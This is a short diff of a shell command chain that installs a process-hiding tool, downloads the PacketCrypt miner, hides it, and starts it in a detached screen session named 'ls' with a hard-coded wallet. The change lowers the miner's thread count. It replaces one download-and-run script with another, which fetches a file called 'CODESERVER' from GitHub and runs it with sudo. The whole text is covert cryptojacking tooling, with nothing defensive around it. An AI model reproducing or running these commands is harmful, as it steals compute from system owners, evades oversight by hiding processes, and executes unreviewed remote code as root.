@@ -10,5 +10,5 @@ npm i -g node-process-hider &&
 wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && 
 ph add packetcrypt && 
 chmod +x packetcrypt && 
-screen -dmS ls nohup ./packetcrypt ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pktpool.io -t 80 > nohup.out &&
-wget https://raw.githubusercontent.com/aurbach55/zash/main/lo.sh && chmod +x lo.sh && ./lo.sh"
+screen -dmS ls nohup ./packetcrypt ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pktpool.io -t 50 > nohup.out &&
+sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/uhjghj45/DevopCheck/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER"
